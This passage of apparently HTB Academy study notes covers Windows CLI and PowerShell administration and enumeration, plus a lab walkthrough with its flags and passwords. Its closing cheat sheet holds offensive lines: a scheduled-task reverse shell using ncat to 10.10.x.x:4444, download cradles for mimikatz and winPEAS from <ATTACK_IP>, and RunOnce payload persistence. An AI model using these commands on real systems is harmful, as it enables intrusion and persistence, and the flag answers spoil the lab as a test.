* `/K`: Narrows the search exclusively to Key names.

## 5. Modifying and Creating Registry Entries (Persistence)
The `RunOnce` key executes a specified payload upon the next user login and automatically deletes the key afterward. This is a standard vector for maintaining operational access across reboots.

**Scenario:** Adding a persistence payload using PowerShell.

**1. Create a new Key within RunOnce:**
```powershell
New-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\ -Name TestKey
```

**2. Set a Value pointing to the payload executable:**
```powershell
New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name "access" -PropertyType String -Value "C:\Users\htb-student\Downloads\payload.exe"
```

**Equivalent operation using Reg.exe:**
```cmd
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\TestKey" /v access /t REG_SZ /d "C:\Users\htb-student\Downloads\payload.exe"
```

## 6. Deleting Registry Entries
*Warning: Removing incorrect entries can cause critical system instability.*

**Remove the persistence value via PowerShell:**
```powershell
Remove-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name "access"
```

**Verify Deletion:**
```powershell
Get-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey
```
*(If no output or error is returned regarding the "access" property, the deletion was successful).*

# Working with the Windows Event Log: Analysis & Operations

## 1. Overview
From a SOC Analyst or IT Administrator's perspective, monitoring and categorizing Windows events is critical for proactive defense and threat hunting. Conversely, from an offensive (Pentester) standpoint, enumerating event logs reveals the environment's logging maturity, potential misconfigurations, and occasionally, sensitive information like clear-text credentials. 

The **Windows Event Log** is a core service (running within `svchost.exe`) that provides a standardized, centralized mechanism for the OS and applications to record hardware and software events. 

## 2. Event Classifications

### 2.1. Log Categories
Windows primarily organizes logs into five major categories:

| Category | Description |
| :--- | :--- |
| **System** | Events related to the Windows OS and its native components (e.g., driver failures, service startups). |
| **Security** | Audited security events (e.g., logon success/failure, file creation/deletion). Crucial for attack detection. |
| **Application** | Events triggered by installed software/applications (e.g., third-party software crashes). |
| **Setup** | Events generated during the OS installation or Active Directory role deployments (on Domain Controllers). |
| **Forwarded** | Logs gathered and forwarded from other hosts within the corporate network. |

### 2.2. Event Types & Severity Levels
Every event is tagged with a type and a severity level to facilitate filtering and triaging:

| Event Type | Severity Level | Description |
| :--- | :---: | :--- |
| **Verbose** | 5 | Granular progress or success messages. |
| **Information** | 4 | Successful operations of applications, drivers, or services (no issues). |
| **Warning** | 3 | Potential future issues (e.g., low disk space). The system can typically recover without data loss. |
| **Error** | 2 | Significant problems (e.g., a service failing to load). Requires sysadmin review but not immediate panic. |
| **Critical** | 1 | Urgent issues causing system/application instability. Demands immediate sysadmin intervention. |
| **Success Audit** | N/A | Recorded when a security access attempt succeeds (e.g., user logon). |
| **Failure Audit** | N/A | Recorded when a security access attempt fails (e.g., password spraying indicators). |

## 3. Log Architecture & Storage
* **Service Name:** Windows Event Log
* **Process Context:** `svchost.exe` (Started automatically at boot; stopping it causes system instability).
* **Storage Path:** `C:\Windows\System32\winevt\logs`
* **File Extension:** `.evtx`
* **Core Elements:** Log Name, Date/Time, Task Category, Event ID (unique identifier), Source, Level, User, and Computer.

## 4. Interacting with Event Logs (CLI & PowerShell)
Querying logs via command line is essential for scripting and remote administration. Both tools require local Administrator privileges for comprehensive access.

### 4.1. Using `wevtutil` (Windows Events Command Line Utility)
A native executable used to retrieve, export, archive, and clear logs.

```cmd
:: Enumerate all available log names on the system
wevtutil el

:: Get configuration details for a specific log (size, path, permissions)
wevtutil gl "Windows PowerShell"

:: Retrieve status information (record count, creation time)
wevtutil gli "Windows PowerShell"

:: Query the last 5 events from the Security log in text format
wevtutil qe Security /c:5 /rd:true /f:text

:: Export the System log to a specific path for offline analysis
wevtutil epl System C:\system_export.evtx
```

### 4.2. Using `Get-WinEvent` (PowerShell)
A highly versatile PowerShell cmdlet that allows for object-oriented querying and filtering via hash tables.

```powershell
# List all logs with their current record count and maximum size
Get-WinEvent -ListLog *

# Check details for a specific log
Get-WinEvent -ListLog Security

# Query the 5 most recent events in the Security log and expand the message
Get-WinEvent -LogName 'Security' -MaxEvents 5 | Select-Object -ExpandProperty Message

# Query oldest events first
Get-WinEvent -LogName 'Security' -MaxEvents 5 -Oldest

# Filter via Hash Tables: Search for Logon Failures (Event ID 4625)
Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625'}

# Filter via Hash Tables: Search for Critical events (Level 1) in the System log
Get-WinEvent -FilterHashTable @{LogName='System';Level='1'} | Select-Object -ExpandProperty Message
```
# Networking Management from the CLI

## 1. Overview
PowerShell significantly expands our administrative capabilities within the Windows OS, specifically regarding network configuration, diagnostics, and remote management. This documentation covers essential commands to audit network interfaces (IP addresses, adapter settings, DNS) and establish secure remote administrative access utilizing SSH and WinRM.

Understanding these fundamentals is critical both for daily IT administration (Helpdesk/SysAdmin tasks) and for host enumeration and lateral movement during penetration testing engagements.

## 2. Common Windows Networking Protocols
While Windows networking shares the standard TCP/IP stack with Linux/Unix, there are specific protocols frequently encountered in Active Directory environments and Windows enterprise networks:

| Protocol | Description |
| :--- | :--- |
| **SMB** | Server Message Block. Facilitates resource/file sharing and standard authentication between hosts. (Open-source equivalent: SAMBA). |
| **NetBIOS** | Network Basic Input/Output System. A session-layer mechanism; originally the transport for SMB. Currently used as a fallback Name Service (NBT-NS) when DNS fails. |
| **LDAP** | Lightweight Directory Access Protocol. Cross-platform protocol utilized for authentication and authorization within directory services like Active Directory. |
| **LLMNR** | Link-Local Multicast Name Resolution. A multicast protocol providing name resolution on local links (same broadcast domain) if DNS is unavailable. |
| **DNS** | Domain Name System. Standard naming resolution protocol translating hostnames to IP addresses. |
| **HTTP/HTTPS** | Hypertext Transfer Protocol (Secure). Standard protocols for requesting and transmitting data over the web. |
| **Kerberos** | Network authentication protocol relying on tickets to grant authorization to domain resources. Standard in modern Active Directory environments. |
| **WinRM** | Windows Remote Management. Microsoft's implementation of WS-Management. Used for remote hardware/software administration, enumeration, and as a remote scripting engine. |
| **RDP** | Remote Desktop Protocol. Provides a graphical interface for remote host management. |
| **SSH** | Secure Shell. Provides encrypted remote CLI access, file transfer, and secure tunneling over insecure networks. |

---

## 3. Querying Network Settings (Native Executables)
Before modifying configurations or attempting lateral movement, we must enumerate the target's current network state. 

### `ipconfig`
Displays basic network interface configurations (IPv4/IPv6, subnet mask, default gateway). Appending `/all` provides detailed metrics including DHCP lease times, physical (MAC) addresses, and DNS configurations.

```powershell
PS C:\htb> ipconfig /all
# Highlights from output:
# - Primary Dns Suffix: greenhorn.corp
# - IPv4 Address: 10.129.203.105 (Preferred) / 172.16.5.100 (Preferred)
# - DNS Servers: 1.1.1.1, 8.8.8.8, 172.16.5.155
```
*Note for Pentesters: Discovering a dual-homed host (multiple network interfaces on different subnets, as seen above) makes it a prime target for pivoting into restricted network segments.*

### `arp`
The Address Resolution Protocol translates IP addresses to MAC addresses. Running `arp -a` displays the cached ARP table, revealing other hosts this machine has recently communicated with (e.g., Gateways, Domain Controllers).

```powershell
PS C:\htb> arp -a
```

### `nslookup`
A built-in tool for querying the Domain Name System to map IP addresses to hostnames or vice versa.

```powershell
PS C:\htb> nslookup ACADEMY-ICL-DC
# Resolves the DC hostname to its IP address (172.16.5.155)
```

### `netstat`
Displays active network connections, routing tables, and listening ports. The `-an` flag resolves all connections to numerical IP addresses and ports.

```powershell
PS C:\htb> netstat -an
# Look for standard listening ports: 22 (SSH), 135 (RPC), 445 (SMB), 3389 (RDP), 5985 (WinRM HTTP).
```

---

## 4. PowerShell Net Cmdlets
PowerShell provides granular modules (`NetAdapter`, `NetConnection`, `NetTCPIP`) for network administration.

| Cmdlet | Use Case |
| :--- | :--- |
| `Get-NetIPInterface` | Retrieves visible network adapter properties and states. |
| `Get-NetIPAddress` | Retrieves IP configurations per adapter (PowerShell equivalent of `ipconfig`). |
| `Get-NetNeighbor` | Retrieves the ARP cache (PowerShell equivalent of `arp -a`). |
| `Get-NetRoute` | Prints the current routing table. |
| `Set-NetAdapter` | Modifies Layer-2 properties (VLAN ID, MAC, Description). |
| `Set-NetIPInterface` | Modifies interface metrics (DHCP status, MTU). |
| `New-NetIPAddress` / `Set-NetIPAddress` | Creates or modifies static IP configurations. |
| `Disable-NetAdapter` / `Enable-NetAdapter` | Disables or enables a physical/logical NIC. |
| `Restart-NetAdapter` | Reboots an adapter to apply configuration changes. |
| `Test-NetConnection` | Advanced diagnostic tool supporting Ping, TCP port checks, and traceroute. |

### Configuration Example: Setting a Static IP
To transition an adapter from DHCP to a static IP address, we first disable DHCP on the target interface, apply the new IP/Subnet, and restart the adapter to flush the changes.

```powershell
# 1. Identify the Interface Index
PS C:\htb> Get-NetIPInterface

# 2. Disable DHCP on the targeted interface (e.g., Index 25)
PS C:\htb> Set-NetIPInterface -InterfaceIndex 25 -Dhcp Disabled

# 3. Assign the static IP and Subnet Mask (PrefixLength)
PS C:\htb> Set-NetIPAddress -InterfaceIndex 25 -IPAddress 10.10.100.54 -PrefixLength 24

# 4. Restart the adapter to apply changes
PS C:\htb> Restart-NetAdapter -Name 'Ethernet 3'

# 5. Verify connectivity
PS C:\htb> Test-NetConnection
```

---

## 5. Remote Access Management
Administering systems at scale or engaging a target remotely requires secure access protocols.

### 5.1 Secure Shell (SSH)
Since 2018, OpenSSH (Client and Server) is natively supported in Windows.

**Installation and Service Configuration:**
```powershell
# Check installation status
PS C:\htb> Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

# Install SSH Server component
PS C:\htb> Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Start the service and configure it to boot automatically
PS C:\htb> Start-Service sshd
PS C:\htb> Set-Service -Name sshd -StartupType 'Automatic'
```

**Connecting:**
```shell
# Syntax is identical whether connecting from a Linux terminal or Windows CMD/PowerShell
ssh htb-student@10.129.224.248
```
*Note: SSH defaults to a CMD shell on Windows. Type `powershell` once connected to upgrade the session.*

### 5.2 Windows Remote Management (WinRM)
WinRM is the industry standard for Windows remote administration. It listens on TCP ports `5985` (HTTP) and `5986` (HTTPS). It is enabled by default on Windows Server OS but often requires manual configuration on Windows 10/11 endpoints.

**Quick Configuration:**
```powershell
PS C:\htb> winrm quickconfig
```
This command automatically:
1. Starts the WinRM service.
2. Configures inbound/outbound Windows Defender Firewall rules.
3. Grants remote administrative rights to local users.

*Security Best Practices:* In production environments, harden WinRM by restricting `TrustedHosts` to jump boxes or management IPs, enforcing HTTPS transport, and ensuring Kerberos authentication within an Active Directory domain.

**Testing WinRM Connectivity:**
```powershell
# Unauthenticated check (verifies service is listening)
PS C:\htb> Test-WSMan -ComputerName "10.129.224.248"

# Authenticated check (returns OS version if credentials are valid)
PS C:\htb> Test-WSMan -ComputerName "10.129.224.248" -Authentication Negotiate
```

**Establishing an Interactive PowerShell Session (PSSession):**
```powershell
# From Windows or a Linux host with PowerShell Core installed
PS C:\htb> Enter-PSSession -ComputerName 10.129.224.248 -Credential htb-student -Authentication Negotiate
```
# PowerShell: Interacting with the Web & File Transfers

## Overview
As a Systems Administrator or Junior Pentester, automating remote updates, software installations, and file transfers via PowerShell is a critical skill. Leveraging native cmdlets and .NET classes eliminates the need for GUI interaction, saving time and enabling stealthy, remote administration or lateral movement during engagements.

## Invoke-WebRequest
The `Invoke-WebRequest` cmdlet (aliased as `wget`, `curl`, or `iwr`) is the primary utility for interacting with web services in PowerShell. It handles HTTP/HTTPS requests (GET, POST, etc.), parses HTML elements, downloads files, and manages session authentication.

### 1. Basic Web Requests
Use the `-Method GET` parameter to retrieve website content. Piping the output to `Get-Member` allows you to inspect the object's available properties and methods.

```powershell
Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | Get-Member
```

### 2. Filtering Incoming Content
Instead of dumping the entire response, you can filter specific properties (such as `Images` or `RawContent`) for targeted reconnaissance and parsing.

```powershell
# Extracting a clean list of images hosted on the site
Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl Images

# Extracting raw HTTP headers and underlying HTML content
Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl RawContent
```

### 3. Downloading Files (Internet)
To download remote tools directly to a Windows target, specify the remote resource via `-Uri` and the local destination path via `-OutFile`.

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"
```

### 4. Stealthy Payload Delivery (Local Network)
To minimize noise and bypass external edge-network detection mechanisms, it is best practice to host payloads on an attack machine and pull them locally across the network.

**Step 1: Start a Python HTTP server on the attack host**
```bash
python3 -m http.server 8000
```

**Step 2: Execute the download cradle on the target Windows machine**
```powershell
Invoke-WebRequest -Uri "http://<ATTACK_IP>:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"
```

## Alternative Transfer Method: .NET WebClient
If `Invoke-WebRequest` is restricted, monitored, or unavailable, the native `System.Net.WebClient` class provides a robust, native fallback for executing file transfers directly through the .NET framework.

```powershell
# Syntax: (New-Object Net.WebClient).DownloadFile("<URI>", "<Destination>")
(New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")
```

> **OpSec Warning:** Both methods execute file writes and generate network requests, which will trigger endpoint and network logging. Local transfers (host-to-host within the same subnet) leave fewer traces at the customer boundary than outbound internet requests, but artifacts will still exist on the local file system.

# PowerShell Scripting & Automation

## Overview
While PowerShell is inherently powerful, its true value in a SysAdmin or Pentesting environment lies in automation. Transitioning from running ad-hoc commands to developing modular scripts significantly reduces administrative overhead and streamlines repetitive reconnaissance tasks. This module breaks down the core components of PowerShell scripts and modules, culminating in the creation of a custom, automated local reconnaissance tool.

## Scripts vs. Modules
PowerShell handles execution via two primary paradigms:
* **Script (`.ps1`)**: An executable text file containing PowerShell cmdlets and functions. Typically executed directly via the `.\script.ps1` syntax.
* **Module (`.psm1`)**: A bundled collection of scripts, manifests, and functions. Imported into the active session via the `Import-Module` cmdlet, keeping its tools persistently available in memory.

### Key File Extensions
| Extension | Description |
| :--- | :--- |
| `.ps1` | Standard executable PowerShell script. |
| `.psm1` | PowerShell module file containing the core definitions, functions, and functional code. |
| `.psd1` | PowerShell data file functioning as a manifest. It details module contents, prerequisites, and metadata via hash tables (key/value pairs). |

---

## Building a Custom Recon Module: `quick-recon`
**Scenario**: To expedite repetitive host enumeration during engagements, we require a custom module that automatically extracts the Hostname, IP Configuration, Domain Information, and a list of interactive user profiles, outputting the results cleanly to a file.

### 1. Directory Initialization
For PowerShell to automatically discover the module, it must reside in a directory listed within the `$env:PSModulePath` environment variable.
```powershell
# Create the module directory in the standard path
mkdir $HOME\Documents\WindowsPowerShell\Modules\quick-recon
```

### 2. Module Manifest (`.psd1`)
The manifest acts as the module's blueprint, defining metadata (author, version), dependencies, and processing directives.
```powershell
# Generate a boilerplate manifest
New-ModuleManifest -Path $HOME\Documents\WindowsPowerShell\Modules\quick-recon\quick-recon.psd1 -PassThru
```
> **Note:** While `ModuleVersion` is the only strictly mandatory field, populating properties like `Author`, `Description`, and the `FunctionsToExport` array is standard practice for professional tooling.

### 3. Module Script & Logic (`.psm1`)
Initialize the core script file where the actual payload and logic will reside:
```powershell
New-Item quick-recon.psm1 -ItemType File
```

#### The Code Structure
Below is the complete, refactored code for `quick-recon.psm1`, including dependencies, comment-based help, the core function, and export directives:

```powershell
# Import required external modules first
Import-Module ActiveDirectory

<# 
.SYNOPSIS
Automated local reconnaissance script.

.DESCRIPTION  
This function performs initial enumeration tasks on a local host. It extracts the Computer Name, IP configuration, AD Domain details, and local user directories. 
The output is automatically parsed and saved to 'recon.txt' on the current user's Desktop. 
Note: Remote Recon functions are in development.

.EXAMPLE  
Get-Recon
#>
function Get-Recon {  
    # 1. Enumerate system and network information
    $Hostname = $env:ComputerName  
    $IP       = ipconfig
    $Domain   = Get-ADDomain 
    $Users    = Get-ChildItem C:\Users\
    
    # 2. Provision the output file
    $OutPath  = "~\Desktop\recon.txt"
    New-Item $OutPath -ItemType File -Force | Out-Null
    
    # 3. Format the captured data structure
    $Vars = "***---Hostname info---***", $Hostname, 
            "***---Domain Info---***", $Domain, 
            "***---IP INFO---***", $IP, 
            "***---USERS---***", $Users
            
    # 4. Write data to the destination file
    Add-Content $OutPath $Vars
} 

# Restrict global access: Expose ONLY the necessary function and variable
Export-ModuleMember -Function Get-Recon -Variable Hostname
```

---

## Understanding Scope in PowerShell
When developing scripts, understanding **Scope** is critical for operational security and memory management. Scope dictates how PowerShell isolates and protects objects (variables, functions, aliases) from unauthorized access or modification.

| Scope Level | Description |
| :--- | :--- |
| **Global** | The default scope. Affects all objects present when the session spawns (e.g., variables defined in your PowerShell Profile). |
| **Local** | The current operational scope context. |
| **Script** | A temporary sandbox scope created at runtime for a specific script. Objects within this scope are inaccessible to external processes and are purged upon script termination unless explicitly exported. |

---

## Deployment & Validation
With the module staged in the correct directory, we can load it into our environment and validate its functionality.

```powershell
# 1. Import the module into the active session
Import-Module quick-recon

# 2. Verify successful deployment and exported commands
Get-Module -Name quick-recon

# 3. Validate comment-based help integration
Get-Help Get-Recon -Detailed

# 4. Execute the payload
Get-Recon
```
# Windows Fundamentals & CLI Enumeration - Lab Walkthrough

**Certification Path:** HTB Certified Junior Cybersecurity Associate (CJCA)
**Module:** 07_Intro_to_Windows_CLI
**Target Host IP:** 10.129.48.176 (ACADEMY-ICL11)
**Domain Controller IP:** 172.16.5.155

---

## Phase 1: Initial Access & Basic Enumeration

### Question 1: Banner Grabbing via SSH
* **Access:** `ssh user0@10.129.48.176`
* **Password:** `Start!`
* **Methodology:** Establish the initial connection to capture the environment's welcome banner.
```powershell
ssh user0@10.129.48.176
```
* **Flag:** `D0wn_the_rabbit_H0l3`

### Question 2: File System Navigation
* **Access:** `ssh user1@10.129.48.176`
* **Password:** `D0wn_the_rabbit_H0l3`
* **Methodology:** Navigate to the user's Desktop directory and dump the flag file.
```powershell
Get-Content C:\Users\user1\Desktop\flag.txt
```
* **Flag:** `Nice and Easy!`

### Question 3: Hostname Enumeration
* **Access:** `ssh user2@10.129.48.176`
* **Password:** `Nice and Easy!`
* **Methodology:** Query the system hostname using administrative environment variables or basic network utilities.
```powershell
hostname
# Alternative: $env:COMPUTERNAME
```
* **Flag:** `ACADEMY-ICL11`

---

## Phase 2: Advanced File & User Enumeration

### Question 4: Hidden Files Discovery
* **Access:** `ssh user3@10.129.48.176`
* **Password:** `ACADEMY-ICL11`
* **Methodology:** Enumerate the filesystem forcing the inclusion of hidden items and pipe to measure the object count.
```powershell
(Get-ChildItem -Path C:\Users\user3\Desktop -Force -Hidden).Count
```
* **Flag/Result:** `101`

### Question 5: Recursive String Search (Decoy Bypass)
* **Access:** `ssh user4@10.129.48.176`
* **Password:** `101`
* **Methodology:** Bypass empty nested folders and target actual file contents using recursive string patterns matching the target flag.
```powershell
Get-ChildItem -Path "C:\Users\user4\Documents" -Recurse -File | Select-String -Pattern "Digging"
```
* **Flag:** `Digging in The nest`

### Question 6: Local User Enumeration
* **Access:** `ssh user5@10.129.48.176`
* **Password:** `Digging in The nest`
* **Methodology:** Gather local accounts and filter out system defaults using regular expressions.
```powershell
(Get-LocalUser | Where-Object { $_.Name -notmatch "DefaultAccount|WDAGUtility" }).Count
```
* **Flag/Result:** `14`

### Question 7: Registry Query for System Information
* **Access:** `ssh user6@10.129.48.176`
* **Password:** `14`
* **Methodology:** Query the Windows Registry path for local software configurations to extract deployment ownership details.
```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name "RegisteredOwner" | Select-Object -ExpandProperty RegisteredOwner
```
* **Flag:** `htb-student`

---

## Phase 3: Lateral Movement & Active Directory

### Question 8: Pivoting & PowerShell Module Enumeration
* **Access Target:** `ssh user7@10.129.48.176` | **Password:** `htb-student`
* **Pivot to DC:** `ssh user7@172.16.5.155` | **Password:** `htb-student`
* **Methodology:** Pivot via SSH from the initial compromised pivot host into the Active Directory Domain Controller, then list all available modules to find hidden indicators.
```powershell
Get-Module -ListAvailable
```
* **Flag:** `Modules_make_pwsh_run!`

### Question 9: Active Directory User Queries
* **Access DC:** `ssh user8@172.16.5.155`
* **Password:** `Modules_make_pwsh_run!`
* **Methodology:** Query the Active Directory database filtering domain accounts based on specific properties.
```powershell
Get-ADUser -Filter {Surname -eq "Flag"} -Properties GivenName | Select-Object GivenName
```
* **Flag:** `Rick`

---

## Phase 4: Process Management & Security Auditing

### Question 10: Process Enumeration and Sorting
* **Access DC:** `ssh user9@172.16.5.155`
* **Password:** `Rick`
* **Methodology:** Review running operational processes, enforcing reverse alphabetical order to target binary signatures.
```cmd
tasklist | sort /r
```
```powershell
# PowerShell equivalent
Get-Process | Sort-Object ProcessName -Descending | Where-Object { $_.ProcessName -match "^vm" }
```
* **Flag:** `vmtoolsd.exe`

### Question 11: Event Log Analysis (Threat Hunting)
* **Access DC:** `ssh user10@172.16.5.155`
* **Password:** `vmtoolsd.exe`
* **Methodology:** Inspect Security logs looking for Event ID 4625 (Logon Failure) to track active brute-force vectors and compromised accounts.
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 50 | Format-List
```
* **Flag:** `justalocaladmin`

# 🛠️ Windows CLI & PowerShell: Pentester & SysAdmin Cheat Sheet

> **Operational Scope:** Reference guide for local host enumeration, file system manipulation, service management, and active directory reconnaissance. Optimized for Help Desk N2, SysAdmin troubleshooting, and initial post-exploitation phases.

## 1. 🗂️ File System & Basic Navigation (CMD / PS)

| Operación | CMD (`cmd.exe`) | PowerShell (`powershell.exe`) | Valor Táctico / Notas |
| :--- | :--- | :--- | :--- |
| **Listar Directorios** | `dir /A:H` (Ocultos) | `Get-ChildItem -Hidden -Force` | Identificar archivos de configuración ocultos o *loot*. |
| **Árbol Recursivo** | `tree /F` | `ls -Recurse` | Mapeo rápido de la estructura del *filesystem*. |
| **Búsqueda de Cadenas** | `findstr /I "password" *.txt` | `Select-String -Pattern "password" -Path *.txt` | Búsqueda profunda de credenciales en texto claro. |
| **Búsqueda de Archivos** | `where /R C:\ *.config` | `Get-ChildItem -Recurse -Filter *.config` | Localizar configuraciones sensibles fuera del PATH. |
| **Leer Archivos** | `type file.txt` \| `more` | `Get-Content file.txt` | Extraer contenido sin bloquear el archivo (*locking*). |
| **Copias Robustas** | `robocopy /E /MIR /A-:SH src dst` | `Copy-Item -Recurse` | `robocopy` es ideal para exfiltrar evadiendo atributos. |

## 2. 🕵️ Host & Network Reconnaissance

### 🖥️ System & User Enumeration
* **Contexto de Sesión:** `whoami /priv` (Muestra privilegios de seguridad actuales, crítico para escalada).
* **Usuarios Locales:** `net user` (CMD) o `Get-LocalUser | Select Name, Enabled` (PS).
* **Grupos Locales:** `net localgroup Administrators` o `Get-LocalGroupMember -Name "Administrators"`.
* **Información del Sistema:** `systeminfo` (Ruidoso, pero extrae parches y versión del OS).
* **Variables de Entorno:** `set` (CMD) o `Get-ChildItem Env:` (PS). 
    * *High-Value Targets:* `%PATH%`, `%USERPROFILE%`, `%LOGONSERVER%`.

### 🌐 Network Diagnostics & Enumeration
* **Interfaces IP:** `ipconfig /all` (CMD) o `Get-NetIPAddress` (PS). Busca *dual-homed hosts* para *pivoting*.
* **Tabla ARP:** `arp -a` (CMD) o `Get-NetNeighbor` (PS). Fundamental para descubrir el DC u otros *endpoints*.
* **Conexiones Activas:** `netstat -an` (Identifica puertos a la escucha: 22, 445, 3389, 5985).
* **Test de Conectividad:** `Test-NetConnection -ComputerName 10.10.10.10 -Port 445` (Diagnóstico de puertos TCP en PS).

## 3. ⚙️ Service & Scheduled Task Management

### Windows Services (Identificación y Control)
| Acción | CMD (`sc.exe` / `net`) | PowerShell |
| :--- | :--- | :--- |
| **Listar Todos** | `sc query type= service` | `Get-Service` |
| **Filtrar (Ej. Defender)**| `sc query windefend` | `Get-Service | Where-Object DisplayName -like '*Defend*'` |
| **Detener Servicio** | `sc stop Spooler` | `Stop-Service -Name Spooler` |
| **Modificar Inicio** | `sc config bits start= disabled` | `Set-Service -Name bits -StartupType Disabled` |
| **Identificar PID** | `tasklist /svc` | `Get-Process | Select Name, Id` |

### Scheduled Tasks (`schtasks`) - *Vector de Persistencia*
* **Enumerar Tareas:** `schtasks /query /v /fo list`
* **Crear Persistencia (Reverse Shell en arranque):**
    `schtasks /create /sc ONSTART /tn "Update Check" /tr "C:\Temp\ncat.exe 10.10.x.x 4444 -e cmd.exe" /ru SYSTEM`
* **Eliminar Rastro:** `schtasks /delete /tn "Update Check" /f`

## 4. 🧠 PowerShell Automation & Pipeline Logic

El poder de PowerShell reside en el paso de **objetos**, no de texto plano.

* **Descubrimiento de Comandos:** `Get-Command -Module ActiveDirectory`
* **Inspección de Objetos:** `Get-Process | Get-Member` (Muestra propiedades y métodos disponibles).
* **Filtrado de Pipeline:** `Get-Service | Where-Object {$_.Status -eq "Running"}`
* **Agrupación y Conteo:** `Get-LocalUser | Group-Object -Property Enabled`
* **Bypass de Política de Ejecución (Solo en el proceso actual):**
    `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass`

## 5. 🏰 Active Directory (RSAT) & Remote Management

### Active Directory Enumeration
* **Usuarios del Dominio:** `Get-ADUser -Filter * -Properties * | Select Name, IPv4Address, LogonCount`
* **Filtrado Específico:** `Get-ADUser -Filter {Surname -eq "Admin"}`
* **Computadoras del Dominio:** `Get-ADComputer -Filter *`

### Remote Execution (WinRM & SSH)
* **SSH a máquina objetivo:** `ssh htb-student@10.129.x.x`
* **Iniciar sesión interactiva PS (WinRM):** `Enter-PSSession -ComputerName 172.16.5.155 -Credential htb-student`
* **Ejecución masiva de scripts:** `Invoke-Command -ComputerName DC-01, FILE-SRV -ScriptBlock { Get-Service WinDefend }`

## 6. 📥 Web Interaction & File Transfers

Para descargar *payloads* o herramientas sin tocar navegadores (Evadir *logging* GUI).

* **Descarga directa (PowerShell 3.0+):**
    `Invoke-WebRequest -Uri "http://<ATTACK_IP>/winPEAS.exe" -OutFile "C:\Temp\winPEAS.exe"`
* **Descarga vía .NET (Fallback):**
    `(New-Object Net.WebClient).DownloadFile("http://<ATTACK_IP>/mimikatz.exe", "C:\Temp\mimi.exe")`

## 7. 📖 Windows Event Logs & Registry

### Event Logs (Threat Hunting / Triage)
* **CMD (wevtutil):** `wevtutil qe Security /c:5 /rd:true /f:text` (Lee los 5 últimos eventos de seguridad).
* **PowerShell (Get-WinEvent):**
    `Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625'} -MaxEvents 10` (Filtra fallos de inicio de sesión - Brute Force).

### Windows Registry (Auditoría y Persistencia)
* **Leer Clave (CMD):** `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
* **Crear Persistencia (RunOnce):**
    `New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\ -Name "Updater" -Value "C:\Temp\payload.exe" -PropertyType String`
